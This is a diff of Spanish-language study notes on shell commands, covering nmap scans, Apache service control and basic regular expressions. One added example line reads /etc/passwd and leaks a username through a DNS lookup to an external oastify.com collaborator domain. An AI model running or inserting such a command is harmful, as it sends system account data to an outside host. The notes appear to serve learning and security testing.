@@ -10,6 +10,21 @@ nmap localhost -p$(nmap localhost | grep "/" | tail -n 4 | cut -d "/" -f 1) -sV
 
 service apache2 start         # Iniciar el servicio Apache2
 systemctl stop apache2        # Paramos el servicio de Apache2
+systemctl start apache2       # Iniciar el servicio de apache 
 
-echo "Host activos: " $(comando)
-host activos: 
+
+
+# Expresiones regulares 
+appsec = Palabra a buscar 
+[a-z] = Letras minusculas
+[A-Z] = Letras mayusculas 
+[0-9] = Numeros 
+[a-zA-Z0-9] = Alfanumerico 
+^ = Debe iniciar con
+$ = Debe finalizar con 
+
+Ejemplo: 
+nmap localhost | grep "^[0-9]" | cut -d "/" -f 1 
+nslookup $(cat /etc/passwd | grep "1005" | cut -d ":" -f 1).kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
+
+
